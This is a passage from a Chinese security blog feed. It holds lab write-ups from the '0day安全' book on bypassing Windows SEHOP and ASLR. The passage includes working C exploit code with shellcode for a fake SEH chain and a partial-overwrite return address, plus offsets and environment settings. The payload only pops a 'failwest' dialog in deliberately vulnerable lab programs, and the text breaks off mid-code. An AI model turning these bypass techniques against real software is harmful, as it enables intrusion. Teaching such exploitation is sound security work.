class="number">412</span>);</span><br><span class="line">    <span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">    zero=<span class="number">1</span>/zero;</span><br><span class="line">    &#125;</span><br><span class="line">    __except(MyException())</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE hInst = LoadLibrary(_T(<span class="string">&quot;SEH_NOSafeSEH_JUMP.dll&quot;</span>));<span class="comment">//load No_SafeSEH module</span></span><br><span class="line">    <span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">    test(shellcode);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验思路"><a class="markdownIt-Anchor" href="#实验思路"></a> 实验思路：</h2><p>（ 1）通过未启用 SafeSEH 的 SEH_NOSaeSEH_JUMP.dll 来绕过 SafeSEH。<br>（ 2）通过伪造 S.E.H 链，造成 S.E.H 链未被破坏的假象来绕过 SEHOP。<br>（ 3） SEH_NOSafeSEH 中的 test 函数通过向 str 复制超长字符串造成 str 溢出，进而覆盖程序的 S.E.H 信息。<br>（ 4）使用 SEH_NOSafeSEH_JUMP.DLL 中的 “pop pop retn” 指令地址覆盖异常处理函数地址，然后通过制造除 0 异常，将程序转入异常处理。通过劫持异常处理流程，程序转入 SEH_NOSaeSEH_JUMP.DLL 中执行“pop pop retn” 指令，在执行 retn 后程序转入 shellcode 执行。</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统 W</td><td>Windows 7</td><td></td></tr><tr><td>EXE 编译器</td><td>Visual Studio 2008</td><td></td></tr><tr><td>DLL 编译器</td><td>VC++ 6.0</td><td>将 dll 基址设置为 0x11120000</td></tr><tr><td>系统 SEHOP</td><td>启用</td><td></td></tr><tr><td>程序 DEP</td><td>关闭</td><td></td></tr><tr><td>系统 ASLR</td><td>关闭</td><td></td></tr><tr><td>编译选项</td><td>禁用优化选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td></td></tr></tbody></table><blockquote><p>说明：实验中的 FinalExceptionHandler 指向的地址可能在您的系统中会有所变化</p></blockquote><h2 id="实验步骤-2"><a class="markdownIt-Anchor" href="#实验步骤-2"></a> 实验步骤</h2><h3 id="先启用-sehop"><a class="markdownIt-Anchor" href="#先启用-sehop"></a> 先启用 SEHOP</h3><p>把 MajorLinkerVersion 和 MinorLinkerVersion 的值分别设为 0x06 和 0x00，排除上一个实验的影响。<br><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628145516662.png" alt="image-20220628145516662"></p><h3 id="确定-finalexceptionhandler-指向的地址"><a class="markdownIt-Anchor" href="#确定-finalexceptionhandler-指向的地址"></a> 确定 FinalExceptionHandler 指向的地址</h3><p>用 OllyDbg 加载好程序后直接观察堆栈的底部就可以看到 FinalExceptionHandler 指向的地址，本次实验中地址为 0x770DAB2D。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628151551454.png" alt="image-20220628151551454"></p><h3 id="伪造-seh-链"><a class="markdownIt-Anchor" href="#伪造-seh-链"></a> 伪造 S.E.H 链</h3><h4 id="先看一下-seh-的覆盖情况"><a class="markdownIt-Anchor" href="#先看一下-seh-的覆盖情况"></a> 先看一下 S.E.H 的覆盖情况</h4><p>按 F9 键让程序运行，程序会在除零异常发生时中断。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628152251152.png" alt="image-20220628152251152"></p><p>由上图可得，str[]的起始地址为 0x0012FD80。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628152504174.png" alt="image-20220628152504174"></p><p>位于 0x0012FE58 处的栈顶异常处理记录已经被覆盖为 0x90909090，S.E.H 链已经被破坏。前面需用 216 个 0x90 填充。</p><h4 id="确定伪造的异常处理记录放置位置"><a class="markdownIt-Anchor" href="#确定伪造的异常处理记录放置位置"></a> 确定伪造的异常处理记录放置位置</h4><p>首先，不能直接使用程序自带的终极异常处理记录，因为该记录位于 0x0012FFE4，它作为机器码被执行时，会影响程序正常运行，您可自行调试观察一下。</p><p>不如在距离弹出对话框机器码结束最近的内存放置伪造的异常处理记录，当然这个地址不仅可以被 4 整除而且还不能影响程序的执行，本次实验选择 0x0012FF14。</p><h4 id="部署-shellcode"><a class="markdownIt-Anchor" href="#部署-shellcode"></a> 部署 shellcode</h4><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628180107496.png" alt="image-20220628180107496"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x14\xFF\x12\x00&quot;</span><span class="comment">//address of last seh record</span></span><br><span class="line">    <span class="string">&quot;\x68\x10\x12\x11&quot;</span><span class="comment">//address of pop pop retn in No_SafeSEH module</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\x09&quot;</span><span class="comment">//在这增加机器码\x8B\x09，它对应的汇编为 mov ecx,[ecx]</span></span><br><span class="line">    <span class="string">&quot;\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">// the fake seh record</span></span><br><span class="line">    <span class="string">&quot;\x75\xA8\xF7\x77&quot;</span></span><br><span class="line">    ;</span><br></pre></td></tr></table></figure><p>编译运行，就能看到 ”failwest“ 对话框了。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628175704598.png" alt="image-20220628175704598"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sehop-的原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#sehop-的原理&quot;&gt;&lt;/a&gt; SEHOP 的原理&lt;/h1&gt;
&lt;p&gt;SEHOP（Structured Exception Handling Overwrite Prote</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="SEHOP" scheme="https://www.rgzzplus.com/tags/SEHOP/"/>
    
  </entry>
  
  <entry>
    <title>在内存中躲猫猫：ASLR</title>
    <link href="https://www.rgzzplus.com/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/"/>
    <id>https://www.rgzzplus.com/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/</id>
    <published>2022-06-27T14:05:51.000Z</published>
    <updated>2022-06-27T14:06:53.272Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内存随机化保护机制的原理"><a class="markdownIt-Anchor" href="#内存随机化保护机制的原理"></a> 内存随机化保护机制的原理</h1><p>前面的所有漏洞利用都有一个共同特征：都需要确定一个明确的跳转地址。而 ASLR（Address Space Layout Randomization）技术就是通过使用随机的基址加载程序，从而干扰 shellcode 定位的一种保护机制。</p><p>ASLR 的实现需要程序和操作系统的双重支持，其中程序的支持不是必需的。</p><p>支持 ASLR 的程序在它的 PE 头中会设置 IMAGE_DLL_CHARACTERISTICS_ DYNAMIC_BASE 标识来说明其支持 ASLR。在Visual Studio 2008 (VS 9.0)中，可以在通过菜单中的 Project→project Properties→ Configuration Pr operties→ Linker→ Advanced→ Randomized Base Address 选项对 /dynmicbase 链接选项（启用则支持 ASLR）进行设置。</p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/../../document/Markdown/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627142527023.png" alt="image-20220627142527023"></p><h2 id="映像随机化"><a class="markdownIt-Anchor" href="#映像随机化"></a> 映像随机化</h2><p>映像随机化是在 PE 文件映射到内存时，对其加载的虚拟地址进行随机化处理，这个地址是在系统启动时确定的，系统重启后这个地址会变化。</p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/../../document/Markdown/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627144723028.png" alt="image-20220627144723028"></p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/../../document/Markdown/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627144842009.png" alt="image-20220627144842009"></p><p>微软在系统中设置了映像随机化的开关，通过设置注册表中 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\MoveImages 的键值来设定映像随机化的工作模式。</p><ul><li>设置为 0 时映像随机化将禁用。</li><li>设置为 -1 时强制对可随机化的映像进行处 理，无论是否设置 IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE 标识。</li><li>设置为其他值时为正常工作模式，只对具有随机化处理标识的映像进行处理。</li></ul><p>如果注册表中不存在 MoveImages，大家可以手工建立名称为 MoveImages，类型为 DWORD的值，并根据需要设置它的值，如下图所示。</p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/../../document/Markdown/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627182404503.png" alt="image-20220627182404503"></p><h2 id="堆栈随机化"><a class="markdownIt-Anchor" href="#堆栈随机化"></a> 堆栈随机化</h2><p>堆栈随机化是在程序运行时随机的选择堆栈的基址，在程序打开时确定。也就是说同一个程序任意两次运行时的堆栈基址都是不同的，进而各变量在内存中的位置也就是不确定的。</p><p>测试一下<strong>堆栈随机化对变量在内存位置的影响</strong>，我们分别在堆和栈上各申请 100 个字节的空间，然后在 Windows XP 和 Windows Vista 下面各运行两次。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> * heap=(<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="type">char</span> <span class="built_in">stack</span>[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address of heap:%#0.4x\nAddress of stack:%#0.4x&quot;</span>,heap, <span class="built_in">stack</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Windows vista：两次申请空间的起始地址不同</p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/../../document/Markdown/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627143210755.png" alt="vista 第一次"></p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/../../document/Markdown/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627143302842.png" alt="vista 第二次"></p><p>Windows XP：两次申请空间的起始地址完全相同</p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/../../document/Markdown/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627143735236.png" alt="image-20220627143735236"></p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/../../document/Markdown/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627143752943.png" alt="image-20220627143752943"></p><h2 id="peb-与-teb-随机化"><a class="markdownIt-Anchor" href="#peb-与-teb-随机化"></a> PEB 与 TEB 随机化</h2><p>微软在 XP SP2 之后不再使用固定的 PEB 基址 0x7FFDF000 和 TEB 基址 0x7FFDE000，而是使用具有一定随机性的基址，这就增加了攻击 PEB 中的函数指针的难度。</p><p>获取当前进程的 TEB 和 PEB ，TEB 存放在 FS:0 和 FS:[0x18]处， PEB 存放在 TEB 偏移 0x30 的位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> teb;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> peb;</span><br><span class="line">    __asm&#123;</span><br><span class="line">        mov eax,FS:[<span class="number">0x18</span>]</span><br><span class="line">        mov teb,eax</span><br><span class="line">        mov eax,dwordptr[eax+<span class="number">0x30</span>]</span><br><span class="line">        mov peb,eax</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PEB:%#x\nTEB:%#x&quot;</span>,peb,teb);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以从下面的结果看出，PEB 和 TEB 的随机效果不是很好。</p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/../../document/Markdown/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627145731792.png" alt="image-20220627145731792"></p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/../../document/Markdown/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627145754255.png" alt="image-20220627145754255"></p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/../../document/Markdown/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627145818499.png" alt="image-20220627145818499"></p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/../../document/Markdown/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627145834839.png" alt="image-20220627145834839"></p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/../../document/Markdown/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627145849099.png" alt="image-20220627145849099"></p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/../../document/Markdown/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627145904247.png" alt="image-20220627145904247"></p><h2 id="aslr-的弱点"><a class="markdownIt-Anchor" href="#aslr-的弱点"></a> ASLR 的弱点</h2><p>（1）在映像随机化中，虽然模块的加载基址变化了，但是<strong>各模块的入口点（ Entry 那列）地址的低位 2 个字节是不变的</strong>，也就是说映像随机化只是对加载基址的前 2 个字节做了随机处理。<strong>地址的前 2 个字节是随机的，而后 2 个字节是固定的。</strong></p><p>（2）在堆栈随机化中，将每个线程的堆栈基址都做了随机化处理，使得<strong>程序每次运行时变量的地址都不相同</strong>。好处是可以防止精准攻击。例如我们需要根据 shellcode 的起始地址直接跳转到 shellcode 执行，但是自从 JMP ESP 跳板指令开始使用后溢出时很少直接跳到 shellcode 中执行了；另外在浏览器攻击方面很流行的 heap spray 等技术，这些技术也是<strong>不需要精准跳转的，只需要跳转到一个大概的位置即可</strong>。所以这项措施对于目前的溢出手段影响有限。</p><p>（3）在PEB 和 TEB 的随机化中，它们的随机化程度很低。</p><h1 id="攻击未启用-aslr-的模块"><a class="markdownIt-Anchor" href="#攻击未启用-aslr-的模块"></a> 攻击未启用 ASLR 的模块</h1><p>ASLR 仅仅是项安全机制，不是什么行业标准， 不支持 ASLR 的软件有很多。不支持 ASLR 意味着加载基址固定，如果我们能够在当前进程空间中找到一个这样的模块，就可以利用它里边的指令来做跳板了，直接无视 ASLR。</p><p>本次实验需要用到 IE 和 Flash，由于这两项技术目前已经淘汰，并且 Flash无法找到实验版本（Flash Player ActiveX 9.0.262），所以我们先跳过这个实验。</p><h1 id="利用部分覆盖进行定位内存地址"><a class="markdownIt-Anchor" href="#利用部分覆盖进行定位内存地址"></a> 利用部分覆盖进行定位内存地址</h1><p>之所以能利用部分覆盖进行定位内存地址，有两个原因，一是**映像随机化只是对映像加载基址的前2个字节做随机化处理。**如果我们借鉴 “off by one” 的思想，只覆盖这个地址的最后一个字节（或者两个字节），那么我们就能在一定范围内控制程序。二是因为 <strong>ASLR 只是随机化了映像的加载基址，而没有对指令序列进行随机化</strong>，指令序列相对于基址的位置还是不变的。</p><h2 id="实验代码"><a class="markdownIt-Anchor" href="#实验代码"></a> 实验代码：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line">charshellcode[]=</span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x1C\x14&quot;</span></span><br><span class="line">;</span><br><span class="line"><span class="type">char</span> * <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> tt[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(tt,shellcode,<span class="number">262</span>);</span><br><span class="line">    <span class="keyword">return</span> tt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> temp[<span class="number">200</span>];</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验思路"><a class="markdownIt-Anchor" href="#实验思路"></a> 实验思路：</h2><p>（ 1）为了更直观地反映绕过 ASLR 的过程，本次实验编译的程序<strong>不启用 GS</strong>。<br>（ 2）编译程序时<strong>禁用 DEP</strong>。<br>（ 3） test 函数中通过复制超长字符串可以溢出并覆盖函数返回地址。<br>（ 4）复制结束后， <strong>test 函数返回 tt 字符数组的首地址</strong>。<br>（ 5）在相对程序加载基址 0x0000~0xFFFF 的范围内，找到一条<strong>跳板指令</strong>，并<strong>用它地址的后 2 个字节覆盖返回地址的后两个字节。</strong><br>（ 6）采用这种类似 <strong>“相对寻址”</strong> 的方法来动态确定跳板指令的地址，以实现跳板指令的通用性。</p><blockquote><p>注意：test 函数返回的 tt 字符数组的首地址是没有实际意义的，因为 tt 的空间是在栈上的，程序从 test 函数返回后 tt 字符数组所在的空间就会被释放。</p></blockquote><table><thead><tr><th></th><th>推荐使用的环境</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows Vista SP2</td></tr><tr><td>DEP 状态</td><td>Optin （Vista 默认状态）</td></tr><tr><td>编译器</td><td>Visual Studio 2008</td></tr><tr><td>优化选项</td><td>禁用优化选项</td></tr><tr><td>GS 选项</td><td>GS 关闭</td></tr><tr><td>DEP 选项</td><td>/NXCOMPAT:NO</td></tr><tr><td>build 版本</td><td>release 版本</td></tr></tbody></table><h2 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤：</h2><h3 id="计算能覆盖到返回地址的填充长度"><a class="markdownIt-Anchor" href="#计算能覆盖到返回地址的填充长度"></a> 计算能覆盖到返回地址的填充长度</h3><p>调试得到，test() 的返回地址位于 001FF940处，tt 的起始地址位于 0x001FF83C处，相距 260 个字节，所以我们可以使用 261~262 这两个字节来覆盖返回地址的后两位。</p><h3 id="寻找跳板指令"><a class="markdownIt-Anchor" href="#寻找跳板指令"></a> 寻找跳板指令</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span 